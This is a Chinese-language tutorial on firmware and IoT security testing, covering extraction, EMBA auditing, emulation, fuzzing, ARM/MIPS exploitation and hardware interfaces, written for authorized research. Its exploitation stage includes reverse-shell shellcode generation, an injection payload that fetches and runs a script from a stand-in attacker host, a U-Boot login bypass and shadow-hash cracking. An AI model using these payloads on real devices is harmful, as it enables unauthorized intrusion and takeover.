# 固件 / IoT 逆向

从一坨 `.bin` / `.img` / `.trx` / `.chk` / OTA zip 起步,闭环走完:解包 → 提取文件系统 → 静态分析 → 模拟 → 动态/利用。方法论参考 OWASP FSTM(Firmware Security Testing Methodology)九阶段。

适用:路由器 / 摄像头 / 智能家居固件审计、固件升级包逆向、IoT CVE 复现、嵌入式漏洞挖掘、自定义二进制协议逆向。单个 ELF/so 的纯静态逆向回到 `reverse-engineering` 主域 / IDA / radare2;仿真起来后做 Web RCE 走渗透相关参考。

## 整体流程与关键判断

```text
固件 .bin
  ├─ 1-3  信息收集 / 获取 / 不解压观察(头部/熵/字符串/magic)
  ├─ 4    提取文件系统   binwalk / unblob / jefferson / ubi_reader
  │         失败 → bootloader 解密例程 / UART dump / SPI flash 物理读
  ├─ 5    文件系统静态分析  EMBA 自动化 + 手工 grep
  ├─ 6    模拟运行   qemu-user + chroot / Firmadyne / FAT / FirmAE
  ├─ 7-8  动态 / 运行时   gdb-multiarch、Ghidra/IDA 远程调试、AFL++
  └─ 9    利用   PoC / payload(ARM / MIPS,注意大小端)
```

- 提取失败 ≠ 加密。先把 binwalk v3、binwalk v2、unblob、jefferson、ubi_reader 都跑一遍再下结论。
- EMBA 一条命令出 HTML 报告省 ~80% 体力活,剩下的才是真正需要脑子的漏洞挖掘。
- 仿真起不来优先怀疑:NVRAM 缺失、网卡名错配、`/dev/` 节点缺失。
- ARM / MIPS payload 必须区分大小端(mipsel vs mipseb),用错直接跑不起来。
- 物理刷写/拆焊前先整片 dump(flashrom / ch341a / minipro)防变砖。法律边界:只对自有设备、书面授权目标、SRC 资产、CTF、公开靶机操作。

## Stage 1-3:信息收集 / 获取 / 初步观察

识别型号、芯片、SDK、已公开 CVE。常见芯片家族:Realtek RTL81xx、Broadcom BCM、MediaTek MT76xx、Qualcomm IPQ。SDK 来源往往决定 binwalk 能否一把提取成功。获取固件四条路:官网下载、OTA 抓包(`mitmdump -s save_response.py`)、UART 落 shell 后 dump、SPI flash 物理读(`flashrom -p ch341a_spi -r dump.bin`)。

不解压先看头部、熵、字符串、可识别签名:

```bash
binwalk firmware.bin                  # magic 扫描
binwalk -E firmware.bin               # 熵图(输出 .png),高熵段 = 压缩/加密
strings -n 8 firmware.bin | less      # banner / 内核版本 / 路径
file firmware.bin && hexdump -C firmware.bin | head -64
```

常见 vendor header:

```text
TRX     HDR0            Asus / Linksys / Netgear 旧款
CHK     2A 23 24 5E     部分 TP-Link
DLOB    4D 5A 4F 41     D-Link 加密头
uImage  27 05 19 56
```

## Stage 4:提取文件系统

提取是整条链的瓶颈,binwalk 一把成功靠运气,多数固件需要换工具组合。

### 工具对比

| 工具 | 优势 | 劣势 |
|------|------|------|
| binwalk v3 (Rust, ReFirmLabs) | 快、并发提取、内存稳 | 插件生态比 v2 小 |
| binwalk v2 (Python) | 插件丰富、兼容好 | 慢、易爆内存、维护暂停 |
| unblob (onekey-sec) | 格式覆盖全(300+)、可作库用 | 安装依赖多 |
| jefferson | 专攻 JFFS2 | 单一用途 |
| ubi_reader | UBI / UBIFS 标准方案 | 大镜像内存占用高 |
| unsquashfs / cramfsck / 7z | 已知格式直接解 | 需先确认偏移 |

选择策略:

```text
未知固件 → binwalk v3 → 失败 → unblob → 仍失败 → 手工 hexdump + 熵分段
已知 JFFS2 → jefferson
已知 UBI   → ubi_reader
已知 SquashFS 且偏移已知 → dd + unsquashfs
```

### 熵判读

| 熵区间 | 含义 |
|--------|------|
| 0.0 - 0.3 | 全 0 / 填充 / 未使用 flash 区 |
| 0.3 - 0.7 | 代码段 / 字符串 / 未压缩数据 |
| 0.7 - 0.95 | 压缩数据(gzip / lzma / xz / squashfs) |
| 0.95 - 1.0 | 加密 / 高熵压缩(注意:高熵不一定加密) |

### 递归提取

```bash
binwalk -e firmware.bin               # 单层提取
binwalk -Me firmware.bin              # 递归提取(matryoshka)
binwalk2 --run-as=root -eM firmware.bin   # v2 兼容老插件
unblob -d out/ firmware.bin
unblob --depth 10 -d out/ firmware.bin    # 深度递归
```

典型输出结构 `_firmware.bin.extracted/` 内含 `*.uImage`、`*.gzip`、`*.squashfs`,squashfs 解开后是 `squashfs-root/`(`bin/ etc/ usr/ lib/ sbin/ ...`)。

### 各文件系统处理

```bash
# SquashFS(路由器最常见)
unsquashfs -d rootfs/ rootfs.squashfs
unsquashfs -d rootfs/ -offset 0x100 rootfs.squashfs   # 非标 magic 指定偏移
sasquatch rootfs.squashfs              # LZMA 变种(老 Realtek SDK),原版解不开时换它

# JFFS2
jefferson rootfs.jffs2 -d rootfs/
jefferson -v -b rootfs.jffs2 -d rootfs/   # 大端
# 失败兜底:挂载
sudo modprobe mtdram total_size=32768 erase_size=128
sudo modprobe mtdblock
sudo dd if=rootfs.jffs2 of=/dev/mtdblock0
sudo mount -t jffs2 /dev/mtdblock0 /mnt/jffs2

# UBI / UBIFS
ubireader_extract_images rootfs.ubi -o out/
ubireader_extract_files rootfs.ubi -o rootfs/
ubireader_utils_info rootfs.ubifs
ubireader_extract_files -p 131072 -l 126976 rootfs.ubi -o rootfs/   # peb/leb 非标手工指定

# CramFS
cramfsck -x rootfs/ rootfs.cramfs

# YAFFS2(老 Android / 部分嵌入式)
unyaffs2 rootfs.yaffs2 rootfs/         # github.com/ehlers/unyaffs2

# CPIO initramfs
cpio -idv < initramfs.cpio

# 设备树 / 内核
dtc -I dtb -O dts -o output.dts device_tree.dtb
# 内核:binwalk -e 后找 zImage/uImage/vmlinux;压缩内核用 vmlinux-to-elf 转 ELF
```

非标 SquashFS 是路由器固件最常见的坑;原版 `unsquashfs` 解不开时优先换 `sasquatch`。

### 多分区(A/B 固件)

```bash
binwalk firmware.bin   # 看到多个 SquashFS 偏移,如 0x100000 / 0x800000
dd if=firmware.bin of=part_a.bin bs=1 skip=$((0x100000)) count=$((0x700000))
dd if=firmware.bin of=part_b.bin bs=1 skip=$((0x800000))
```

### 加密固件兜底

先判断是不是真加密:全段熵 ~0.99 且无任何 magic → 大概率加密或纯压缩。检查偏移 0x100 / 0x200 / 0x1000 是否藏 magic:

```bash
binwalk --offset 256  firmware.bin
binwalk --offset 4096 firmware.bin
xxd firmware.bin | head -8
```

处理路径(按代价从低到高):

```text
1. 找官方升级固件,对比加密版 vs 明文版
2. UART 进 U-Boot,把固件载入内存等设备解密后再 dump
3. SPI flash 物理 dump(含 bootloader 段)
4. 逆 bootloader / 升级工具找硬编码密钥
5. 复用已公开的同芯片解密方案
```

U-Boot 内存 dump 解密后镜像:

```text
=> tftpboot 0x80000000 firmware.bin
=> md.b 0x80000000 0x800000              # 看一眼内容
=> save tftp 0x80000000 dump.bin 0x800000
```

逆 U-Boot 找解密例程:入口 `board_init_r` → `do_bootm` 前的 `image_decrypt`,通常 AES-128-CBC、key 硬编在 `.rodata`。离线解密:

```bash
openssl enc -d -aes-128-cbc -K $(cat key.hex) -iv $(cat iv.hex) \
  -in encrypted_fw.bin -out decrypted.bin
```

解出来后回到 Stage 4 重走标准流程。bootloader 也加密 / 有安全启动 → 查 SoC 一级 ROM 文档、公开 fault injection / glitch 资料。

### 失败兜底

```bash
binwalk --signature firmware.bin       # 全文件搜 magic
xxd firmware.bin | grep -E "(hsqs|sqsh)"  # SquashFS magic 手搜
xxd firmware.bin | grep -E "1f 8b 08"     # gzip magic
dd if=firmware.bin of=seg.bin bs=4096 skip=256 count=512 && file seg.bin   # 按熵切片
ddrescue -d -r3 /dev/sdb dump.bin dump.log          # SPI dump 有 ECC 错误
nanddump --noecc --omitoob -f clean.bin /dev/mtd0   # NAND 含 OOB 剥离
# SPI 物理读不稳:dump 3 次 sha256sum 取多数票,不一致就降速/换 clip
```

### 提取后立即做

```bash
cd squashfs-root/
ls -la                                 # 期望 bin/ etc/ lib/ sbin/ usr/ var/ ...
cat etc/inittab etc/init.d/rcS 2>/dev/null; ls etc/init.d/   # 启动脚本
grep -rE "(password|passwd|admin|root):" etc/passwd etc/shadow 2>/dev/null
find . -name httpd -o -name lighttpd -o -name mini_httpd -o -name uhttpd
find . -path "*cgi-bin*" -type f
find . -name telnetd -o -name dropbear -o -name sshd
cat etc/banner etc/issue etc/version 2>/dev/null; strings bin/busybox | head -3
```

`/etc/shadow` 拿到默认密码 hash 离线破:`john --wordlist=rockyou.txt shadow`。

`firmwalker`(github.com/craigz28/firmwalker)可自动扫提取后 rootfs 里的敏感线索(凭据 / 私钥 / URL / 后门二进制):`./firmwalker.sh squashfs-root`。

## Stage 5:文件系统静态分析(EMBA)

EMBA(Embedded Analyzer, github.com/e-m-b-a/emba)= 开源固件自动化审计框架,一条命令跑完格式识别、提取、二进制 checksec、CVE 比对、用户态/全系统仿真、HTML 报告。仅 Linux(Ubuntu 22.04 / Debian 12 / Kali)。

```bash
# 标准全套
sudo ./emba -l ./logs/x -f ./firmware.bin -p ./scan-profiles/default-scan.emba
# 深度 + Docker 隔离 + Web 报告 + 多核 + QEMU 仿真
sudo ./emba -D -l ./logs/x -f ./firmware.bin -p ./scan-profiles/default-scan.emba -t -Q -W
# 快速预扫(跳 QEMU,看值不值得深挖)
sudo ./emba -D -l ./logs/x -f ./firmware.bin -p ./scan-profiles/quick-scan.emba
```

常用参数:`-l` log 目录 / `-f` 固件 / `-p` profile / `-t` 多核 / `-Q` 启用 QEMU 仿真 / `-W` web 报告 / `-g` grep-able log / `-D` Docker 内运行(推荐)。profile:`default-scan` 全套、`quick-scan` 快扫、`default-scan-no-notify` 离线、`default-scan-emulation` 加强仿真。

内置调度的扫描器:cve-bin-tool(NVD CVE 比对)、Semgrep、bandit、checksec、Trivy(SBOM)、shellcheck/yara、pixd(熵图)、binwalk+unblob 提取后端、EMBA 自家硬编码密钥/危险函数规则。

报告解读 — 打开 `logs/<target>/html-report/index.html`,关键模块:

```text
F50 Aggregator       一页总结,先看这个
S05 Firmware details 内核版本 / busybox 版本 / SDK 厂商
S09 Version detection 识别出的二进制 + 版本(对比 CVE)
S12 Binary protection checksec 汇总(没开 NX/RELRO 的更易利用)
S108 Password/Secrets 硬编码凭据
L10 System emulation  仿真是否成功 + 跑起来的服务(看 netstat)
```

CVE 别全信,按此顺序复核:① 评分 ≥7.5 且影响网络服务(lighttpd/dropbear/内置 httpd) → ② 有公开 PoC → ③ version string 命中确认存在 → ④ 暴露在监听端口(结合 L10 仿真 netstat) → ⑤ 不需认证或认证易绕。

何时手工而非 EMBA:加密/私有格式(提不出来)、单个二进制深度逆向(IDA/Ghidra)、协议/业务逻辑漏洞、找 0day(EMBA 仅辅助)。

EMBA 坑:installer.sh 卡住=网络问题换源;CVE 全 N/A = cve-bin-tool 数据库没下完,重跑 installer / `./emba_db_update.sh`;Docker 磁盘爆清 `/var/lib/docker/overlay2`;内存推荐 32GB+(大固件 64GB)。自定义规则塞 `external/yara/`、`config/semgrep_rules/`,模块加载顺序由 `modules/` 下文件名前缀决定。

手工补扫:

```bash
grep -rE "(password|passwd|admin|secret|api_key|token)=" squashfs-root/
find squashfs-root/ -name "*.conf" -o -name "*.ini" -o -name shadow
checksec --file=squashfs-root/usr/sbin/httpd
```

## Stage 6:模拟运行

| 档位 | 工具 | 适用 |
|------|------|------|
| 用户态 | qemu-*-static + chroot | 单个二进制(httpd / cgibin) |
| 全系统 | Firmadyne / FAT / FirmAE | 整固件起 init / 网络栈 / NVRAM |
| 半真机 | qemu + 真硬件 GPIO/协处理器透传 | 涉及外设 |
| 纯真机 | UART / JTAG | 仿真起不来必须上硬件 |

### 用户态(QEMU User Mode)

最快路径,几条命令出 shell:

```bash
cp /usr/bin/qemu-mipsel-static squashfs-root/usr/bin/
sudo chroot squashfs-root /usr/bin/qemu-mipsel-static /bin/sh
sudo chroot squashfs-root /usr/bin/qemu-mipsel-static /usr/sbin/httpd
qemu-mipsel-static -L squashfs-root/ squashfs-root/usr/sbin/httpd   # 不 chroot,路径相对
```

架构 → qemu binary 对照:

| 固件架构 | qemu binary |
|---------|-------------|
| MIPS little-endian (MT 系列) | qemu-mipsel-static |
| MIPS big-endian (BCM 系列) | qemu-mips-static |
| ARM little-endian (多数) | qemu-arm-static |
| ARM64 | qemu-aarch64-static |
| PowerPC | qemu-ppc-static |
| SuperH | qemu-sh4-static |

判断架构:`file squashfs-root/bin/busybox` → 看 ELF 行,`LSB` = little-endian(mipsel),`MSB` = big-endian(mipseb)。

用户态的坑:`/proc` 不可用 → `mount -t proc proc squashfs-root/proc`;缺设备节点 → `mknod squashfs-root/dev/null c 1 3`;DNS 失败 → 拷 `/etc/resolv.conf`;低端口 bind 需 root;`nvram_get` 拿不到值 → 用户态无 NVRAM,httpd 经常崩,上全系统仿真。

### 全系统(Firmadyne)

完整流程:提取 → 识别架构 → 装配可启动 image → 推断网络 → 启动 + NVRAM hack。需 PostgreSQL(`createuser firmadyne` / `createdb -O firmadyne firmware` / 导入 `database/schema`),`./download.sh` 下预编译内核。

```bash
cd ~/tools/firmadyne; FW=/path/to/firmware.bin
./sources/extractor/extractor.py -b TPLink -sql 127.0.0.1 -np -nk "$FW" images
IID=$(psql -d firmware -U firmadyne -c "SELECT id FROM image ORDER BY id DESC LIMIT 1;" -t | tr -d ' ')
./scripts/getArch.sh "./images/${IID}.tar.gz"
./scripts/tar2db.py -i "$IID" -f "./images/${IID}.tar.gz"
sudo ./scripts/makeImage.sh "$IID"
./scripts/inferNetwork.sh "$IID"
./scratch/${IID}/run.sh                 # 启动,输出仿真 IP
```

启动后 `nmap -p- <IP>` / `curl -I http://<IP>/` 探服务。

NVRAM hack:Firmadyne 自带 `libnvram.so` hook 所有 nvram 读取返回默认值。崩在特定 `nvram_get` 时往 `nvram_files/nvram.default` 追加项再重打包:

```bash
echo "wan_ipaddr=192.168.0.100" >> ~/tools/firmadyne/nvram_files/nvram.default
echo "lan_ifname=br0"           >> ~/tools/firmadyne/nvram_files/nvram.default
sudo ./scripts/makeImage.sh "$IID"
```

常见坑:

| 现象 | 原因 / 修法 |
|------|------|
| 卡在 "init started" | 缺 /dev 节点 → 镜像里 `MAKEDEV` 手建 |
| httpd 启动即崩 | nvram_get 缺值 → 加 nvram.default |
| bind 错网卡 | inferNetwork 推错 → 改 run.sh 的 `-net nic` |
| 内核 panic / IPC 错 | 架构识别错或内核不匹配 → 重跑 getArch.sh / 换对应架构内核 |
| 没网卡 | 进 shell `ifconfig br0 192.168.0.1 up` |
| 串口卡死 | run.sh 加 `-serial mon:stdio` |

### FAT / FirmAE

- FAT(Firmware Analysis Toolkit, attify):Firmadyne 封装,`sudo ./fat.py /path/to/firmware.bin` 一条命令自动跑完 extractor → getArch → makeImage → inferNetwork → run 到仿真 shell。适合快验,遇坑回 Firmadyne 手工流程。
- FirmAE:Firmadyne 改进版,容错更高,Docker 化:
  ```bash
  docker run -it --rm -v $(pwd):/firmware firmae:latest /work/run.sh -d 1 /firmware/firmware.bin
  ```
- 仿真起 Web 后直接 `nuclei` / `nikto` / `curl` 扫。

## Stage 7-8:动态 / 运行时分析与 fuzz

### 调试器接入

```bash
# 用户态 + gdbserver
qemu-mipsel-static -g 1234 -L squashfs-root/ ./vuln_binary
gdb-multiarch ./vuln_binary -ex "set architecture mips" -ex "target remote :1234"
# 全系统:run.sh 里 qemu-system-mips 加 -s -S,再 gdb-multiarch target remote :1234
```

### AFL++ fuzz

| 模式 | 速度 | 适用 |
|------|------|------|
| 源码编译 afl-clang-lto | 最快 | 有源码 |
| QEMU mode (-Q) | 慢 5-10x | 仅有 binary |
| Persistent mode | 比 QEMU 快 5-10x | 需简单 harness 改造 |

```bash
# QEMU mode(对仿真二进制)
cd ~/tools/aflpp/qemu_mode && CPU_TARGET=mipsel ./build_qemu_support.sh
mkdir -p in/ && echo "GET / HTTP/1.0" > in/seed1
afl-fuzz -Q -i in/ -o out/ -- qemu-mipsel-static -L squashfs-root/ squashfs-root/usr/sbin/httpd
afl-whatsup out/

# 有源码:重编译快 5-10 倍
export CC=afl-clang-lto CXX=afl-clang-lto++ AFL_USE_ASAN=1
make clean && make && afl-fuzz -i in/ -o out/ -- ./target @@
```

Persistent harness 把目标主循环改造为 input-driven:`__AFL_FUZZ_INIT()` + `while (__AFL_LOOP(10000)) { process_request(__AFL_FUZZ_TESTCASE_BUF, __AFL_FUZZ_TESTCASE_LEN); }`。

网络服务 fuzz 用 boofuzz(`pip3 install boofuzz`),`s_initialize` 定义协议帧、`fuzzable=True` 标可变字段、`session.fuzz()`,配合 run.sh console 看 crash。

### Ghidra headless 批处理

批量分析多个二进制 / 自动跑脚本提取信息时用 headless 模式,不开 GUI:

```bash
analyzeHeadless /path/to/project_dir ProjectName \
  -import squashfs-root/usr/sbin/httpd \
  -postScript extract_strings.py \
  -scriptPath ./scripts

# 批量导入整个目录
analyzeHeadless /tmp/proj FW -import 'squashfs-root/usr/sbin/*' -recursive
```

raw 固件 / 裸 MMIO 二进制需手工选处理器和加载地址。Ghidra 自带 EmulatorHelper 可在分析期模拟一段函数解密数据(写寄存器/内存 → setBreakpoint → run → readMemory)。

## Stage 9:利用 — ARM / MIPS payload

```bash
# pwntools 生成 reverse shell shellcode
python3 - <<'EOF'
from pwn import *
context.clear(arch='mips', endian='little', os='linux')   # mipsel
print(asm(shellcraft.connect('192.168.1.100', 4444) + shellcraft.dupsh()).hex())
context.clear(arch='arm', endian='little', os='linux')
print(asm(shellcraft.connect('192.168.1.100', 4444) + shellcraft.dupsh()).hex())
EOF

# ROP gadget 搜索
ropper --file ./httpd --search "system"
ROPgadget --binary ./httpd --only "pop|ret"
```

典型链(命令注入类):仿真态确认 `hostname` 等参数直拼 `system()` → 构造 `` hostname=`;wget http://attacker/x;sh x;` `` → 仿真反弹 shell → 真机复测 → 提报。

## 架构差异速记

ARM(IoT 最常见):4 字节 ARM 指令 / 2 字节 Thumb,函数指针 LSB=1 表 Thumb。Ghidra 右键 Processor Options 切 ARM/Thumb。`apt install gcc-arm-linux-gnueabihf gdb-multiarch`。

AArch64/ARM64:参数+返回值 x0-x7,x8 间接结果,x19-x28 callee-saved,x29=fp,x30=lr(返回地址在寄存器不在栈,仅当函数再调用别人才压栈),sp 必 16 字节对齐,xzr 零寄存器。无 RIP 相对寻址,用 `ADRP+ADD` 对加载 PC 相对地址。定长 4 字节指令 → ROP gadget 更受限,主要靠 `LDP`(load pair)从栈弹多个寄存器的 gadget;`STP/LDP` 序对(prologue/epilogue 保存恢复 callee-saved)是主要 gadget 来源。`NOP = 0xD503201F`。

MIPS:big-endian(Broadcom)vs little-endian(MT)用 `file` / ELF 头确认。分支延迟槽 — branch 后那条指令一定执行。`$gp` 全局指针指向 `.got`(PIC)。`lui + addiu` 对加载 32 位常量(高 16 + 低 16)。

RISC-V:特权级 M(固件/bootloader)/ S(内核)/ U(应用);关注 CSR `mstatus/mtvec/mepc/mcause/satp`。自定义扩展 Zbb/Zbc/Zbs(位操作)、Zk*(AES/SHA/SM3/SM4 加速)。调试 `openocd -f interface/jlink.cfg -f target/riscv.cfg` + `riscv64-*-gdb target remote :3333`,或 `qemu-riscv64 -g 1234`。

硬件 crypto 加速器在反汇编里表现为对特定 MMIO 基址 / 协处理器寄存器的写:MIPS OCTEON 的 `dmtc2/dmfc2`(选择子 0x100-0x40FF)驱动 CP2 硬件 AES/SHA;微控制器(如 EFM32 Cortex-M)AES 外设是固定基址 MMIO 寄存器写。识别基址后查厂商参考手册逆 key 加载序列。

RTOS:FreeRTOS 看 `xTaskCreate` / 任务名字符串("IDLE"/"Tmr Svc")/ `xQueueSend`;Zephyr 看 `k_thread_create` / `CONFIG_*` 符号;裸机看 `0x0` / `0x08000000`(STM32)的中断向量表 + `while(1)` 主循环 + 数据手册里的外设寄存器地址。

## 硬件接口

| 接口 | 能力 | 工具 | 识别 |
|------|------|------|------|
| UART | 串口控制台,常给 root shell / bootloader | USB-TTL(CP2102/FT232,3.3V)、screen/minicom/picocom | 4 针(GND/TX/RX/VCC),万用表测 |
| JTAG | 直接 CPU 调试,读写 flash / 设断点 | OpenOCD、J-Link、Bus Pirate、Tigard | 10/14/20 针 header,JTAGulator 自动探测 |
| SPI Flash | 直接读整片固件 | flashrom、CH341A | 8 针 SOIC(Winbond/Macronix 等) |
| eMMC | 嵌入式 MMC(路由器/手机) | eMMC reader,焊测试点 | — |

UART 实操:路由 TX→USB-TTL RX、路由 RX→USB-TTL TX、GND 对接、**不接 VCC**(设备自供电)。万用表识别:GND 接地铜片;VCC 启动稳定 3.3V;TX 启动时电平跳变多;RX 基本不变。

```bash
sudo screen /dev/ttyUSB0 115200        # 或 minicom / picocom
# 看不到字符 = 波特率不对,逐个试:
for b in 9600 19200 38400 57600 115200 460800 921600; do
  echo "--- $b ---"; timeout 3 sudo cat /dev/ttyUSB0 < <(stty -F /dev/ttyUSB0 $b cs8 -cstopb -parenb)
done
# 乱码 = TX/RX 接反 或 电平不匹配(确认 3.3V 而非 5V)
```

U-Boot 单用户绕密码(无可用 login 凭据时):启动时按键中断(常按空格 / Ctrl+C)进交互:

```text
=> setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock2 rootfstype=squashfs init=/bin/sh"
=> saveenv
=> boot
```

U-Boot 无按键响应(厂商关了 console)→ 固件里找 `bootdelay`,或物理短接 SPI flash 制造启动失败逼 U-Boot 进交互。

## 网络协议逆向(自定义二进制 / PCAP / Protobuf)

设备走 TCP 自定义二进制协议(非 HTTP),抓到 PCAP,需还原帧结构、字段含义、加密层,写本地 client/server 复现。

4 步法:

```text
1. 看节奏  Wireshark Statistics → Conversations(IP/端口对)+ I/O Graphs(数据节奏),定位会话边界
2. 找帧界  Follow → TCP Stream → RAW 导出;xxd 看每帧前几字节是不是固定 magic / 长度字段
3. 拆字段  固定头 / 长度 / TLV / payload / CRC
4. 验加密  熵(ent dump.bin / binwalk -E,>7.5 几乎肯定加密)+ 找 nonce/IV + 二进制反查 send/recv 周围 struct
```

找长度字段:把同流所有 PSH 包导出,看每个 segment 总长,在位置 i / i+1 / i+2 上试长度字段(LE/BE、含不含自身)能否推出 segment 长度,列方程组解。

scapy 写 parser(快速一次性):定义 `Packet` 子类,`fields_desc` 用 `StrFixedLenField`(magic)、`ByteField`、`LenField`、`StrLenField`(`length_from=lambda p: p.length-N`);`rdpcap('dump.pcap')` 遍历 `p[TCP].payload`。

Kaitai Struct(长期复用首选):YAML `.ksy` 描述结构(`meta.endian` / `seq` 字段 `type: u1/u2/u4`、`contents:` 定 magic、`size: length-N`),`ksc` 生成 Python/Java/C++/JS parser。

Protobuf:无 `.proto` 时用 `protoc --decode_raw < msg.bin` 看字段号 + wire type 推结构;有符号的二进制可从 strings / 反编译里恢复 `.proto`(`protodec` 等工具从二进制提取 descriptor)。

坑:Wireshark 只显示 "Data" = 私有协议无 dissector,写 < 100 行 Lua dissector 或离线 Python;每帧都不同 = 压缩/加密层,先熵判;TLS 抓到解不了 = 客户端不留 SSLKEYLOGFILE → 进程层 Frida hook `ssl_read`/`ssl_write` 抓明文;数据对但服务端不响应 = 协议带递增 seq/nonce,重放被拒,需搞清 seq 计算(前帧 hash 或递增计数器)。NetworkMiner 比 Wireshark 更适合事后取证(自动重组文件 / 识别凭证)。

## 工具清单

固件链强依赖 Linux,Windows 用 WSL2 Ubuntu 或独立 Kali/Ubuntu VM(EMBA / Firmadyne / FAT 必须 Linux)。常用:binwalk v3/v2、unblob、jefferson、ubi_reader、sasquatch、firmwalker、EMBA、Firmadyne / FAT / FirmAE、qemu-user-static / qemu-system-*、AFL++、boofuzz、pwntools、ropper / ROPgadget、flashrom、picocom/screen/minicom、gdb-multiarch、Ghidra、Wireshark / scapy / Kaitai Struct。

## 引用

- OWASP FSTM: https://scriptingxss.gitbook.io/firmware-security-testing-methodology
- binwalk v3: https://github.com/ReFirmLabs/binwalk
- unblob: https://github.com/onekey-sec/unblob
- jefferson: https://github.com/sviehb/jefferson · ubi_reader: https://github.com/onekey-sec/ubi_reader
- EMBA: https://github.com/e-m-b-a/emba(demo 报告 https://e-m-b-a.github.io/emba/)
- Firmadyne: https://github.com/firmadyne/firmadyne · FAT: https://github.com/attify/firmware-analysis-toolkit
- AFL++: https://github.com/AFLplusplus/AFLplusplus · boofuzz: https://github.com/jtpereyda/boofuzz · pwntools: https://github.com/Gallopsled/pwntools
- firmwalker: https://github.com/craigz28/firmwalker
